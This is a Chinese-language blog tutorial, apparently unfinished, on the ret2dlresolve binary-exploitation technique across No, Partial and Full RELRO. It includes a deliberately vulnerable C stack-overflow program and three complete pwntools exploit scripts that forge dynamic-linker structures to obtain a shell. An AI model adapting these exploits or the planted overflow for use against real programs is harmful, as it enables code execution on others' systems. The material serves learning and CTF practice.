---
layout: post
title: return to Dynamic Resolver
excerpt: "return to Dynamic Resolver"
categories: [未完待续]
comments: true
---

#### return to Dynamic Resolver
不需要leak information和libc版本


RELRO:Relocation Read Only
- No RELRO : 所有相关的data structure几乎都能写
- Partial RELRO : .dynamic 、.dynsym、.dynstr等只能读(这个是gcc默认值)
- Full RELRO：所有的symbol载入时解析已经完成，GOT只读，没有link_map和resolver的指标

##### Leakless基本要求
- 非Full ASLR，probgram本身的memory layout要已知
- 通常有information leak时，使用DynELF会比较方便

#### No RELRO
伪造.dynstr
- readelf找出.dynamic中DT_STRTAB的位置,并改变它的值
- 把原本的.dynstr指向一个可控制的buffer,在buffer上放system的字串
- 跳一个还没有resolver过的symbol



#### ld的修改
可以`vim a.out`,然后该其中的ld


漏洞代码
```c
#include <stdio.h>
#include <unistd.h>
#include <string.h>

char buf[1000000];

int main() {
  char local[10];
  int len = read(0, buf, sizeof(buf));
  memcpy(local, buf, len);
  return 0;
}
```
通过`readelf -a no | less`查看到STRTAB是Dynamic的从零起第八个
```
Dynamic section at offset 0x604 contains 24 entries:
  标记        类型                         名称/值
 0x00000001 (NEEDED)                     共享库：[libc.so.6]
 0x0000000c (INIT)                       0x80482b4
 0x0000000d (FINI)                       0x80484e4
 0x00000019 (INIT_ARRAY)                 0x80495f8
 0x0000001b (INIT_ARRAYSZ)               4 (bytes)
 0x0000001a (FINI_ARRAY)                 0x80495fc
 0x0000001c (FINI_ARRAYSZ)               4 (bytes)
 0x6ffffef5 (GNU_HASH)                   0x804818c
 0x00000005 (STRTAB)                     0x804820c
```
所以`dynamic_dynstr = dynamic + 8 * 8 `

memcpy结构
```
----------------
memcpy          |	原本的return addr
----------------|
new return addr |
----------------|
arg 1           |
----------------|
arg 2           |
----------------|
arg 3           |
----------------|

```

norelo最终代码(伪造.dynstr)
```python
from pwn import *

context.arch='i386'
r = process('./no')

read = 0x80482f0        #objdump -d no | grep read
memcpy = 0x8048300      #objdump -d no | grep memcpy
plt0 = 0x80482e0        #readelf -aW no |grep .plt
pop3 = 0x80484d9        #ROPgadget --binary no | less
pop2 = 0x80484da        #ROPgadget --binary no | less
pop1 = 0x80484db        #ROPgadget --binary no | less
gmon = 0x08048310       #08048310 <__gmon_start__@plt> 一个没有调用过的方法的位置    objdump -d no |grep __gmon_start__

buf = 0x8049740         #gdb-peda$ p &buf
d = buf + 2048          #这个指向的data的位置

dynamic = 0x08049604        #readelf -a no | grep dynamic
dynamic_dynstr = dynamic + 8 * 8        #dynamic中的第八个指向的是dynamic_dynstr

rop = flat(
    memcpy, pop3, dynamic_dynstr + 4, d, 4,     #这个就是从d(data)这里开始memcpy 4个byte,到dynamic_dynstr + 4,其中memcpy这个是return address
    gmon, 0xdeadbeef, d + 12   #d+12是'sh' 字串的位置             跳到__gmon_start__这个没有调用过的function,0xdeadbeef为call完之后的return address
    )

data = flat(
    d + 4 - 56,  # __gmon_start__中str+offset中offset为0x38,即56                #!!!!这个是strtab的指针,例如该值为0x41414141,那么0x41414141指向的值就是strtab
    'system\x00\x00' #__gmon_start__中str+offset指向了这个值
    'sh\x00'                                    #这个就是system的参数
    )

raw_input('@')
r.send(('A'*18 + p32(buf+1024+4)).ljust(1024, '\0') + rop.ljust(1024, '\0') + data)

r.interactive()
```

#### parti relo

伪造`.rel.plt`的enrty 
- 传一个特大的reloc_arg进去,使得.rel.plt+relog_arg落在可控的记忆体上,而`rel.plt`中有`offset和info(index索引)`,给index一个特大的值,使symtab进入到可控记忆体的位置,使`.dynstr + st_name`处放'system\0'

这个就是由于.dystr不可改,所以给一个巨大的reloc_arg让.dynsym落在可控区域,然后再伪造dynsym的st_name,使`.dynstr + st_name`落在可控区域,最终的exp
```python
from pwn import *

context.arch='i386'
r = process('./partial')

plt0 = 0x8048300
buf = 0x804a060
d = buf + 2048
relplt = 0x80482b4
dynsym = 0x80481cc
dynstr = 0x804822c

rop = flat(
    plt0, d - relplt, 0xdeadbeef, d + 36,   #直接跳到plt[0],d - relplt为plt0之前的参数,该参数可以让rel.plt直接落在data位置上,   d + 36指向了" sh"
    )
data = flat(
    [buf, 0x07 | (((d+12-dynsym)/16)<<8)], 0, # Elf32_Rel结构,其中的索引让symtab指向了像一行伪造的Elf32_Sym
    [d+28-dynstr, 0, 0, 0x12],  # 伪造的Elf32_Sym,构造虚假的偏移,让 .dynstr + offset 指向了下一行的system
    'system\x00\x00', # d+36
    'sh\x00'
    )
r.send(('A'*18 + p32(buf+1024+4)).ljust(1024, '\0') + rop.ljust(1024, '\0') + data)
r.interactive()
```
注意:`gnu.version[r_info>>8]`要为0

#### part 修改link_map
最终的exp
```python
#coding=utf-8
from pwn import *

context.arch='i386'

r = process('./partial')

# partial ver
memcpy = 0x8048320
pop3 = 0x80484f9
got1 = 0x804a004
gmon = 0x8048330

buf = 0x804a060
s = buf + 1024
d = buf + 2048

rop = flat(
    memcpy, pop3, s+32, got1, 4,  # 20          copy link_map
    memcpy, pop3, buf, 0x00, 56,  # 40          
    memcpy, pop3, buf+52, d, 4,   # 60
    memcpy, pop3, s+88, got1, 4,  # 80
    memcpy, pop3, 0x00, buf, 56,  # 100
    gmon, 0xdeadbeef, d + 20,
    )

data = flat(
    d+4, # 4
    [5, d+12-56], # 12
    'system\x00\x00', # 20
    'sh\x00'
    )

raw_input('#')
r.send(('A'*18 + p32(buf+1024+4)).ljust(1024, '\0') + rop.ljust(1024, '\0') + data)
r.interactive()
```

#### full relro:重新找回link_map和resolver
找回link_map
- `.dynamic`中DT_DEBUG指向r_debug结构
- r_debug中r_map指向link_map

找回resolver
- 先用l_next多走一层,再用l_info[DT_PLTGOT]找出library的`.got.plt`地址
- 因为大部分library都不是full relro,所以library的got2回事resolver

`readelf -aW full | less`

```
Dynamic section at offset 0xee8 contains 26 entries:
  标记        类型                         名称/值
 0x00000001 (NEEDED)                     共享库：[libc.so.6]
 0x0000000c (INIT)                       0x80482d4
 0x0000000d (FINI)                       0x8048504
 0x00000019 (INIT_ARRAY)                 0x8049edc
 0x0000001b (INIT_ARRAYSZ)               4 (bytes)
 0x0000001a (FINI_ARRAY)                 0x8049ee0
 0x0000001c (FINI_ARRAYSZ)               4 (bytes)
 0x6ffffef5 (GNU_HASH)                   0x80481ac
 0x00000005 (STRTAB)                     0x804822c
 0x00000006 (SYMTAB)                     0x80481cc
 0x0000000a (STRSZ)                      81 (bytes)
 0x0000000b (SYMENT)                     16 (bytes)
 0x00000015 (DEBUG)                      0x0					#第十二个entry
```
```
readelf -aW partial | grep dynamic
  [21] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4
```
```
p/x ((Elf32_Dyn*)0x08049f14)[12]
```
```
0x00000015	0xf7ffd8e4
```
```
x/32wx 0xf7ffd8e4
0xf7ffd8e4 <_r_debug>:	0x00000001	0xf7ffd900	0xf7fea800	0x00000000
0xf7ffd8f4 <_r_debug+16>:	0xf7fda000	0x00000000	0x00000000	0x00000000
```
第二个值`0xf7ffd900`就是linkmap


